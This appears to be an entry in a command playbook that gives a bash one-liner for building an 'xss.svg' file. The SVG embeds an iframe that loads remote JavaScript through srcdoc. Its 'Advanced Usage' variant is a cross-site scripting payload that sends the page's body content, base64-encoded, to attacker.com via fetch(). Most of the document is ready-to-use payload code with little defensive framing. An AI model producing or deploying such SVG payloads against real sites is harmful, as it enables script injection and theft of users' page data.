---
data: >-
  echo '<svg id="xss" xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe
  xmlns="http://www.w3.org/1999/xhtml" srcdoc=\'&lt;script
  src=https://gitlab.com/username/project/-/jobs/123/artifacts/raw/alert.js&gt;&lt;/script&gt;\'&gt;&lt;/iframe&gt;&lt;/foreignObject&gt;&lt;/svg>'
  > xss.svg
tags:
  - svg
  - xss
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 91445994-2650-4e46-9472-fac080605ad6
created_at: '2025-12-13T23:52:43.666Z'
updated_at: '2025-12-13T23:52:43.666Z'
verified: false
validated: true
submitted: true
---
# create-xss-svg-file

## Command

```bash
echo '<svg id="xss" xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc=\'&lt;script src=https://gitlab.com/username/project/-/jobs/123/artifacts/raw/alert.js&gt;&lt;/script&gt;\'&gt;&lt;/iframe&gt;&lt;/foreignObject&gt;&lt;/svg>' > xss.svg
```

## Description

This command generates an xss.svg file embedding an iframe that loads external JS via srcdoc, using foreignObject for XHTML compatibility in SVG context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL in srcdoc | Replace with actual artifact URL | Yes |

## Examples

### Basic Usage

```bash
echo '<svg id="xss" xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc=\'&lt;script src=https://gitlab.com/username/project/-/jobs/123/artifacts/raw/alert.js&gt;&lt;/script&gt;\'&gt;&lt;/iframe&gt;&lt;/foreignObject&gt;&lt;/svg>' > xss.svg
```

### Advanced Usage

For different payloads, adjust srcdoc content.

```bash
echo '<svg id="xss" xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc=\'&lt;script&gt;fetch(\'https://attacker.com?data=\' + btoa(document.body.innerHTML));&lt;/script&gt;\'&gt;&lt;/iframe&gt;&lt;/foreignObject&gt;&lt;/svg>' > xss.svg
```

## Expected Output

Creates xss.svg file; viewable in browser as empty SVG, but functional when referenced.

## Related

- [[Related Procedure]]
